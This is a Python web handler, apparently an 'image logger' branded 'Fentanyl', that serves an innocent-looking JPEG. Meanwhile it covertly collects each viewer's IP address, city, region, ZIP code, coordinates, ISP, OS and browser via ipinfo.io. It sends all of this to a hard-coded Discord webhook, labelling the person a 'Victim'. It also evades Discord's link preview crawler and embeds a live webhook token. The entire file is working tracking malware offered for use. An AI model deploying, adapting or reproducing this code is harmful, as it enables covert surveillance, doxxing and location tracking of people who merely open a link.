from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1455399419166851214/KZZxNhgKp2IE9Oc-oCAq-WJMzOzfgLiXhJUS7Tu-o9gs3rJlBJ8yRfIvJpr-9t_jq6c7'

bindata = httpx.get('data:image/jpeg;base64,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').content
buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
